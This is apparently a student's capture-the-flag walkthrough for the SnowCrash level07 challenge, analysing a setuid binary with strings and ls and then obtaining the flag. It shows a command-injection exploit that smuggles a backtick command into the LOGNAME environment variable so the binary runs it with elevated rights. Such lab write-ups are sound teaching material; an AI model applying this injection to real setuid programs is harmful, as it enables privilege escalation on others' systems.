Tring revers enginerieng the binary file level07

strings level07

LOGNAME		There's certenly a variable
/bin/echo %s    probably we print the LOGNAME value


asprintf

setresuid   set the user and the group id 
setresgid

getegid     to get the extended group id
geteuid     to get the extended user id


Executing the binary file
level07@SnowCrash:~$ ./level07 
level07


level07@SnowCrash:~$ ls -la level07 
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

with the output of the strings and the ls, we can supose that the programe get the uid of the flag07 user and we can execute the binary file with level07 same as the with the permission of the flag07

the LOGNAME is probably the name of the current user saved in $LOGNAME val

level07@SnowCrash:~$ export LOGNAME='test'
level07@SnowCrash:~$ ./level07 
test

so ours suposition is verrified 

so we will exploiate the echo commande and execute getflag through it, 

comme the echo is a built in commande we can not change the binary file like in the previous exo, so we'll execute the getflag through the the variable

level07@SnowCrash:~$ export LOGNAME=\`getflag\` ; ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
